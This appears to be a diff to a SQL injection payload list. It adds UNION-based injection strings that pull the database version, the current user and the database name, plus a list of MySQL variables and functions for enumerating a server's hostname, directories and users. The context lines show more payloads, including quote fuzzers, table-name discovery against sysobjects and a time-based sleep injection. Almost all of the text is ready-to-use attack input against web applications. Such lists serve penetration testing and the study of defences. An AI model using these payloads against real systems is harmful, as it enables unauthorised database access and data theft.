@@ -1,7 +1,6 @@
 
 -- SQL Injection Payload List --
 
-
 '
 ''
 `
@@ -65,7 +64,6 @@ AND false
 -1' UNION SELECT 1,2,3--+
 ' UNION SELECT sum(columnname ) from tablename --
 
-
 -1 UNION SELECT 1 INTO @,@
 -1 UNION SELECT 1 INTO @,@,@
 
@@ -75,9 +73,28 @@ AND false
 
 ' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
 
+0' or 1=1 UNION SELECT null, version() #
+0' or 1=1 UNION SELECT user(), database() #
+
+
+
+Retrieve information about the database, SQL server and tables:
+
+• @@hostname : Current Hostname
+• @@tmpdir : Tept Directory
+• @@datadir : Data Directory
+• @@version : Version of DB
+• @@basedir : Base Directory
+• user() : Current User
+• database() : Current Database
+• version() : Version
+• schema() : current Database
+• UUID() : System UUID key
+• current_user() : Current User
+
+
 
 Finding the table name
-
 
 Time-Based:
 ,(select * from (select(sleep(10)))a)
